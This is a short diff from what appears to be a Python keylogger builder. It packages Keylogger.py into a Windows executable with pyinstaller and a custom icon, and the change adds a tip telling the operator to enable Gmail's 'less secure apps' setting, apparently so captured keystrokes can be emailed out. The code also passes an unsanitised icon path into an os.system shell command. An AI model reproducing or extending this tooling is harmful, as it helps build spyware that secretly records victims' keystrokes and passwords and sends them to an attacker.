@@ -56,7 +56,7 @@ def main(argv):
 			os.system("sudo wine pyinstaller --onefile --icon='" + iconfile + "' --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.py")
 		else:
 			os.system("pyinstaller --onefile --icon='" + iconfile + "' --hidden-import='pywintypes32.dll' Keylogger.py")
-		print("open dist folder and get your exe keylogger ")
+		print("open dist folder and get your exe keylogger\nif you use Gmail allow less secure applications from this link https://myaccount.google.com/lesssecureapps ")
 	else:
 		print('Not implemented yet')
 
